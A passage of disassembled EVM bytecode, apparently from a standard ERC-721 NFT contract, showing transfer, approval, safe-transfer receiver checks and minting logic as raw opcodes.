0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0xC13 DUP5 PUSH2 0x4A7 JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0xC54 DUP3 PUSH2 0x685 JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ PUSH2 0xCAA JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0xCA1 SWAP1 PUSH2 0x1D3C JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ ISZERO PUSH2 0xD1A JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0xD11 SWAP1 PUSH2 0x1D7C JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH2 0xD27 DUP4 DUP4 DUP4 PUSH1 0x1 PUSH2 0x1193 JUMP JUMPDEST DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0xD47 DUP3 PUSH2 0x685 JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ PUSH2 0xD9D JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0xD94 SWAP1 PUSH2 0x1D3C JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x4 PUSH1 0x0 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD SWAP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 SSTORE PUSH1 0x1 PUSH1 0x3 PUSH1 0x0 DUP6 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP3 DUP3 SLOAD SUB SWAP3 POP POP DUP2 SWAP1 SSTORE POP PUSH1 0x1 PUSH1 0x3 PUSH1 0x0 DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP3 DUP3 SLOAD ADD SWAP3 POP POP DUP2 SWAP1 SSTORE POP DUP2 PUSH1 0x2 PUSH1 0x0 DUP4 DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH32 0xDDF252AD1BE2C89B69C2B068FC378DAA952BA7F163C4A11628F55A4DF523B3EF PUSH1 0x40 MLOAD PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG4 PUSH2 0xF29 DUP4 DUP4 DUP4 PUSH1 0x1 PUSH2 0x12B9 JUMP JUMPDEST POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x2 PUSH1 0x0 DUP4 DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ ISZERO PUSH2 0xFDA JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0xFD1 SWAP1 PUSH2 0x1D9C JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST DUP1 PUSH1 0x5 PUSH1 0x0 DUP6 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH1 0xFF MUL NOT AND SWAP1 DUP4 ISZERO ISZERO MUL OR SWAP1 SSTORE POP DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH32 0x17307EAB39AB6107E8899845AD3D59BD9653F200F220920489CA2B5937696C31 DUP4 PUSH1 0x40 MLOAD PUSH2 0x10CB SWAP2 SWAP1 PUSH2 0x1CBF JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 POP POP POP JUMP JUMPDEST PUSH2 0x10E3 DUP5 DUP5 DUP5 PUSH2 0xC34 JUMP JUMPDEST PUSH2 0x10EF DUP5 DUP5 DUP5 DUP5 PUSH2 0x12BF JUMP JUMPDEST PUSH2 0x112E JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x1125 SWAP1 PUSH2 0x1D1C JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH2 0x114E DUP3 DUP3 PUSH1 0x40 MLOAD DUP1 PUSH1 0x20 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x0 DUP2 MSTORE POP PUSH2 0x1456 JUMP JUMPDEST POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x1174 DUP4 PUSH2 0xF2E JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ ISZERO SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x1 DUP2 GT ISZERO PUSH2 0x12B3 JUMPI PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ PUSH2 0x1227 JUMPI DUP1 PUSH1 0x3 PUSH1 0x0 DUP7 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP3 DUP3 SLOAD PUSH2 0x121F SWAP2 SWAP1 PUSH2 0x1F7B JUMP JUMPDEST SWAP3 POP POP DUP2 SWAP1 SSTORE POP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ PUSH2 0x12B2 JUMPI DUP1 PUSH1 0x3 PUSH1 0x0 DUP6 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP3 DUP3 SLOAD PUSH2 0x12AA SWAP2 SWAP1 PUSH2 0x1F25 JUMP JUMPDEST SWAP3 POP POP DUP2 SWAP1 SSTORE POP JUMPDEST JUMPDEST POP POP POP POP JUMP JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x12E0 DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x14B1 JUMP JUMPDEST ISZERO PUSH2 0x1449 JUMPI DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x150B7A02 PUSH2 0x1309 PUSH2 0xADE JUMP JUMPDEST DUP8 DUP7 DUP7 PUSH1 0x40 MLOAD DUP6 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x132B SWAP5 SWAP4 SWAP3 SWAP2 SWAP1 PUSH2 0x1C73 JUMP JUMPDEST PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x1345 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL SWAP3 POP POP POP DUP1 ISZERO PUSH2 0x1376 JUMPI POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x1373 SWAP2 SWAP1 PUSH2 0x19BB JUMP JUMPDEST PUSH1 0x1 JUMPDEST PUSH2 0x13F9 JUMPI RETURNDATASIZE DUP1 PUSH1 0x0 DUP2 EQ PUSH2 0x13A6 JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH1 0x0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0x13AB JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP PUSH1 0x0 DUP2 MLOAD EQ ISZERO PUSH2 0x13F1 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x13E8 SWAP1 PUSH2 0x1D1C JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST DUP1 MLOAD DUP2 PUSH1 0x20 ADD REVERT JUMPDEST PUSH4 0x150B7A02 PUSH1 0xE0 SHL PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND DUP2 PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND EQ SWAP2 POP POP PUSH2 0x144E JUMP JUMPDEST PUSH1 0x1 SWAP1 POP JUMPDEST SWAP5 SWAP4 POP POP POP POP JUMP JUMPDEST PUSH2 0x1460 DUP4 DUP4 PUSH2 0x14D4 JUMP JUMPDEST PUSH2 0x146D PUSH1 0x0 DUP5 DUP5 DUP5 PUSH2 0x12BF JUMP JUMPDEST PUSH2 0x14AC JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x14A3 SWAP1 PUSH2 0x1D1C JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EXTCODESIZE GT SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ ISZERO PUSH2 0x1544 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x153B SWAP1 PUSH2 0x1DDC JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH2 0x154D DUP2 PUSH2 0x1152 JUMP JUMPDEST ISZERO PUSH2 0x158D JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x1584 SWAP1 PUSH2 0x1D5C JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH2 0x159B PUSH1 0x0 DUP4 DUP4 PUSH1 0x1 PUSH2 0x1193 JUMP JUMPDEST PUSH2 0x15A4 DUP2 PUSH2 0x1152 JUMP JUMPDEST ISZERO PUSH2 0x15E4 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x15DB SWAP1 PUSH2 0x1D5C JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x1 PUSH1 0x3 PUSH1 0x0 DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP3 DUP3 SLOAD ADD SWAP3 POP POP DUP2 SWAP1 SSTORE POP DUP2 PUSH1 0x2 PUSH1 0x0 DUP4 DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH32 0xDDF252AD1BE2C89B69C2B068FC378DAA952BA7F163C4A11628F55A4DF523B3EF PUSH1 0x40 MLOAD PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG4 PUSH2 0x16EE PUSH1 0x0 DUP4 DUP4 PUSH1 0x1 PUSH2 0x12B9 JUMP JUMPDEST POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1705 PUSH2 0x1700 DUP5 PUSH2 0x1EBC JUMP JUMPDEST PUSH2 0x1E97 JUMP JUMPDEST SWAP1 POP DUP3 DUP2 MSTORE PUSH1 0x20 DUP2 ADD DUP5 DUP5 DUP5 ADD GT ISZERO PUSH2 0x1721 JUMPI PUSH2 0x1720 PUSH2 0x215A JUMP JUMPDEST JUMPDEST PUSH2 0x172C DUP5 DUP3 DUP6 PUSH2 0x2023 JUMP JUMPDEST POP SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x1743 DUP2 PUSH2 0x2496 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x1758 DUP2 PUSH2 0x24AD JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x176D DUP2 PUSH2 0x24C4 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH2 0x1782 DUP2 PUSH2 0x24C4 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP3 PUSH1 0x1F DUP4 ADD SLT PUSH2 0x179D JUMPI PUSH2 0x179C PUSH2 0x2155 JUMP JUMPDEST JUMPDEST DUP2 CALLDATALOAD PUSH2 0x17AD DUP5 DUP3 PUSH1 0x20 DUP7 ADD PUSH2 0x16F2 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x17C5 DUP2 PUSH2 0x24DB JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x17E1 JUMPI PUSH2 0x17E0 PUSH2 0x2164 JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x17EF DUP5 DUP3 DUP6 ADD PUSH2 0x1734 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x40 DUP4 DUP6 SUB SLT ISZERO PUSH2 0x180F JUMPI PUSH2 0x180E PUSH2 0x2164 JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x181D DUP6 DUP3 DUP7 ADD PUSH2 0x1734 JUMP JUMPDEST SWAP3 POP POP PUSH1 0x20 PUSH2 0x182E DUP6 DUP3 DUP7 ADD PUSH2 0x1734 JUMP JUMPDEST SWAP2 POP POP SWAP3 POP SWAP3 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 PUSH1 0x60 DUP5 DUP7 SUB SLT ISZERO PUSH2 0x1851 JUMPI PUSH2 0x1850 PUSH2 0x2164 JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x185F DUP7 DUP3 DUP8 ADD PUSH2 0x1734 JUMP JUMPDEST SWAP4 POP POP PUSH1 0x20 PUSH2 0x1870 DUP7 DUP3 DUP8 ADD PUSH2 0x1734 JUMP JUMPDEST SWAP3 POP POP PUSH1 0x40 PUSH2 0x1881 DUP7 DUP3 DUP8 ADD PUSH2 0x17B6 JUMP JUMPDEST SWAP2 POP POP SWAP3 POP SWAP3 POP SWAP3 JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 DUP1 PUSH1 0x80 DUP6 DUP8 SUB SLT ISZERO PUSH2 0x18A5 JUMPI PUSH2 0x18A4 PUSH2 0x2164 JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x18B3 DUP8 DUP3 DUP9 ADD PUSH2 0x1734 JUMP JUMPDEST SWAP5 POP POP PUSH1 0x20 PUSH2 0x18C4 DUP8 DUP3 DUP9 ADD PUSH2 0x1734 JUMP JUMPDEST SWAP4 POP POP PUSH1 0x40 PUSH2 0x18D5 DUP8 DUP3 DUP9 ADD PUSH2 0x17B6 JUMP JUMPDEST SWAP3 POP POP PUSH1 0x60 DUP6 ADD CALLDATALOAD PUSH8 0xFFFFFFFFFFFFFFFF DUP2 GT ISZERO PUSH2 0x18F6 JUMPI PUSH2 0x18F5 PUSH2 0x215F JUMP JUMPDEST JUMPDEST PUSH2 0x1902 DUP8 DUP3 DUP9 ADD PUSH2 0x1788 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP6 SWAP2 SWAP5 POP SWAP3 POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x40 DUP4 DUP6 SUB SLT ISZERO PUSH2 0x1925 JUMPI PUSH2 0x1924 PUSH2 0x2164 JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x1933 DUP6 DUP3 DUP7 ADD PUSH2 0x1734 JUMP JUMPDEST SWAP3 POP POP PUSH1 0x20 PUSH2 0x1944 DUP6 DUP3 DUP7 ADD PUSH2 0x1749 JUMP JUMPDEST SWAP2 POP POP SWAP3 POP SWAP3 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x40 DUP4 DUP6 SUB SLT ISZERO PUSH2 0x1965 JUMPI PUSH2 0x1964 PUSH2 0x2164 JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x1973 DUP6 DUP3 DUP7 ADD PUSH2 0x1734 JUMP JUMPDEST SWAP3 POP POP PUSH1 0x20 PUSH2 0x1984 DUP6 DUP3 DUP7 ADD PUSH2 0x17B6 JUMP JUMPDEST SWAP2 POP POP SWAP3 POP SWAP3 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x19A4 JUMPI PUSH2 0x19A3 PUSH2 0x2164 JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x19B2 DUP5 DUP3 DUP6 ADD PUSH2 0x175E JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x19D1 JUMPI PUSH2 0x19D0 PUSH2 0x2164 JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x19DF DUP5 DUP3 DUP6 ADD PUSH2 0x1773 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x19FE JUMPI PUSH2 0x19FD PUSH2 0x2164 JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x1A0C DUP5 DUP3 DUP6 ADD PUSH2 0x17B6 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x1A1E DUP2 PUSH2 0x1FAF JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH2 0x1A2D DUP2 PUSH2 0x1FC1 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1A3E DUP3 PUSH2 0x1EED JUMP JUMPDEST PUSH2 0x1A48 DUP2 DUP6 PUSH2 0x1F03 JUMP JUMPDEST SWAP4 POP PUSH2 0x1A58 DUP2 DUP6 PUSH1 0x20 DUP7 ADD PUSH2 0x2032 JUMP JUMPDEST PUSH2 0x1A61 DUP2 PUSH2 0x2169 JUMP JUMPDEST DUP5 ADD SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1A77 DUP3 PUSH2 0x1EF8 JUMP JUMPDEST PUSH2 0x1A81 DUP2 DUP6 PUSH2 0x1F14 JUMP JUMPDEST SWAP4 POP PUSH2 0x1A91 DUP2 DUP6 PUSH1 0x20 DUP7 ADD PUSH2 0x2032 JUMP JUMPDEST PUSH2 0x1A9A DUP2 PUSH2 0x2169 JUMP JUMPDEST DUP5 ADD SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1AB2 PUSH1 0x2D DUP4 PUSH2 0x1F14 JUMP JUMPDEST SWAP2 POP PUSH2 0x1ABD DUP3 PUSH2 0x217A JUMP JUMPDEST PUSH1 0x40 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1AD5 PUSH1 0x32 DUP4 PUSH2 0x1F14 JUMP JUMPDEST SWAP2 POP PUSH2 0x1AE0 DUP3 PUSH2 0x21C9 JUMP JUMPDEST PUSH1 0x40 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1AF8 PUSH1 0x25 DUP4 PUSH2 0x1F14 JUMP JUMPDEST SWAP2 POP PUSH2 0x1B03 DUP3 PUSH2 0x2218 JUMP JUMPDEST PUSH1 0x40 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1B1B PUSH1 0x1C DUP4 PUSH2 0x1F14 JUMP JUMPDEST SWAP2 POP PUSH2 0x1B26 DUP3 PUSH2 0x2267 JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1B3E PUSH1 0x24 DUP4 PUSH2 0x1F14 JUMP JUMPDEST SWAP2 POP PUSH2 0x1B49 DUP3 PUSH2 0x2290 JUMP JUMPDEST PUSH1 0x40 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1B61 PUSH1 0x19 DUP4 PUSH2 0x1F14 JUMP JUMPDEST SWAP2 POP PUSH2 0x1B6C DUP3 PUSH2 0x22DF JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1B84 PUSH1 0x29 DUP4 PUSH2 0x1F14 JUMP JUMPDEST SWAP2 POP PUSH2 0x1B8F DUP3 PUSH2 0x2308 JUMP JUMPDEST PUSH1 0x40 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1BA7 PUSH1 0x20 DUP4 PUSH2 0x1F14 JUMP JUMPDEST SWAP2 POP PUSH2 0x1BB2 DUP3 PUSH2 0x2357 JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1BCA PUSH1 0x18 DUP4 PUSH2 0x1F14 JUMP JUMPDEST SWAP2 POP PUSH2 0x1BD5 DUP3 PUSH2 0x2380 JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1BED PUSH1 0x30 DUP4 PUSH2 0x1F14 JUMP JUMPDEST SWAP2 POP PUSH2 0x1BF8 DUP3 PUSH2 0x23A9 JUMP JUMPDEST PUSH1 0x40 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1C10 PUSH1 0x21 DUP4 PUSH2 0x1F14 JUMP JUMPDEST SWAP2 POP PUSH2 0x1C1B DUP3 PUSH2 0x23F8 JUMP JUMPDEST PUSH1 0x40 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1C33 PUSH1 0x3D DUP4 PUSH2 0x1F14 JUMP JUMPDEST SWAP2 POP PUSH2 0x1C3E DUP3 PUSH2 0x2447 JUMP JUMPDEST PUSH1 0x40 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x1C52 DUP2 PUSH2 0x2019 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x1C6D PUSH1 